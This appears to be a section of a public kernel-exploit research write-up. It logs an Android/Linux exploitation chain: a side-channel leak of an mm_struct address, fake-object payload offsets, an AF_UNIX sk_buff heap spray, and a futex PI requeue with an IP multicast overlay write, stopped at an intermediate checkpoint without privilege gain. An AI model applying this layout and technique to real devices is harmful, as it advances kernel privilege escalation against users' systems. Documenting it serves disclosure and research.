# 03. mm/slab, payload, and 3.1 trigger closure

## Abstract

This file records the kernel observation chain before the 3.1 endpoint. It covers only mm/slab positioning, payload self-check, AF_UNIX/sk_buff spray, futex PI requeue, IP multicast side effect, and `route_done=1`. Public documentation does not enter any stage after 3.1.

## mm/slab positioning

Empirical logs:

```text
[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] timing stage=page-mm-seed pid=23917 elapsed_ms=1670
[*] ks inc threads 128/512
[*] ks inc threads 256/512
[*] ks inc threads 384/512
[*] ks inc threads 512/512
[*] kernelsnitch waiters=512 target=905 baseline=9 threshold=90 margin=4 elapsed_ms=297
[*] kernelsnitch collision-scan found=7/7 elapsed_ms=2220
[*] kernelsnitch collision-scan leaked mm=ffffff8165295640
[*] timing stage=page-mm-layout pid=23917 elapsed_ms=4722
```

Conclusion:

| Item | Value |
| --- | --- |
| `mm_struct` size | `960` / `0x3c0` |
| slab order | `3` |
| objects per slab | `34` |
| partial slabs | `13` |
| collision target | `8` |
| observed collision | `7/7` |
| leaked `mm` | `ffffff8165295640` |
| derived slab base | `ffffff8165290000` |

`slab_base = leaked & ~0x7fff` is the source alignment rule. The address is a base for this run's payload geometry, not a cross-boot constant.

## Payload geometry

Empirical logs:

```text
[*] tcp payload geometry slab_base=ffffff8165290000 payload_base=ffffff8165290000 payload_bias=0xe80 fake_lock=ffffff8165291350 fake_w0=ffffff8165292220 fake_task=ffffff8165295800 fake_fops=ffffff8165291000 wait_lock=ffffff8165291370 owner=ffffff8165295801
[*] final lock mode=active-final base=ffffff8165291350 lock=ffffff8165291370 root=ffffff8165292220 leftmost=ffffff8165292220 owner=ffffff8165295801 fake_w0_prio=255 pi_parent=ffffff8165290ff8 pi_top=ffffffe77c8ec200
[*] tcp fops pi geometry parent=ffffff8165290ff8 right=0000000000000000 left=0000000000000000 final_pi_write=1 waiter_lock=ffffff8165291370
[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff8165291000
```

Source constants and observed addresses:

| Object | Offset | Observed address |
| --- | ---: | --- |
| payload bias | `0xe80` | `ffffff8165290e80` |
| fake fops | `0x1000` | `ffffff8165291000` |
| fake lock | `0x1350` | `ffffff8165291350` |
| wait lock | `0x1370` | `ffffff8165291370` |
| fake waiter W0 | `0x2220` | `ffffff8165292220` |
| fake task | `0x5800` | `ffffff8165295800` |

`final payload invariant ok` proves internal consistency of the two user-space 32 KiB chunks. It is necessary evidence, not standalone hit proof.

## Spray result

Empirical logs:

```text
[*] af_unix order3 staged pairs=64 requested=64
[*] timing stage=page-spray-stage pid=23917 elapsed_ms=4724
[*] sk_buff pcp send ret=65536 errno=0
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
[*] timing stage=page-reclaim-send pid=23917 elapsed_ms=4961
[-] kpage state unavailable flags_fd=-1 count_fd=-1 errno=13
[*] timing stage=page-cleanup pid=23917 elapsed_ms=6279
[*] timing stage=page-total pid=23917 elapsed_ms=6279
[*] timing stage=fops-page pid=23917 elapsed_ms=6279
[+] refclone fops page ready base=ffffff8165290000
```

Conclusion:

| Item | Observed |
| --- | --- |
| staged pairs | `64/64` |
| send count | `4096/4096` |
| payload length | `0x8e80` |
| first failure | `ret=0 errno=0` |
| kpage state | unavailable from shell, `errno=13` |

`kpage state unavailable` is a permission-limited negative fact. It does not negate the preceding spray count.

## futex PI and IP multicast side effect

Empirical logs:

```text
[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 target=x28+0x38 value=ffffff8165291370 final_fops=1 full_waiter=0 overlay=marker
[*] slide final tree parent=ffffff8002c84ea0 right=ffffff8165291000 left=0 pi_write=1
[*] slide ip overlay qwords 20=ffffff8002c84ea0 28=ffffff8165291000 30=0 38=ffffff8165290ff8 40=0 48=0 50=ffffffe77c8ec200 58=ffffff8165291370 60=00000000000000ff
[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
00002771e00000 route_done=1
```

Conclusion:

| Observation | Value | Boundary |
| --- | --- | --- |
| PI requeue | `ret=-1 errno=35` | EDEADLK-shaped return appeared |
| overlay parameters | `group_req_size=0x88 marker_off=0x58` | entered the IP multicast side-effect path |
| tree parent | `ffffff8002c84ea0` | consistent with the target-slot-minus-8 layout |
| fake fops value | `ffffff8165291000` | consistent with payload geometry |
| scheduler side effect | `calls=1 sched_ok=1` | at least one consumer `sched_setattr` succeeded |
| 3.1 endpoint | `route_done=1` | worker reached the 3.1 endpoint |

## Termination statement

The public repository's technical conclusion ends at `route_done=1`. The reference log then shows the host process remained:

```text
uid=2000(shell) gid=2000(shell) ... context=u:r:shell:s0
```

Therefore the public conclusion contains no privilege-state change, no technical material after 3.1, and no downstream material not listed in this document.
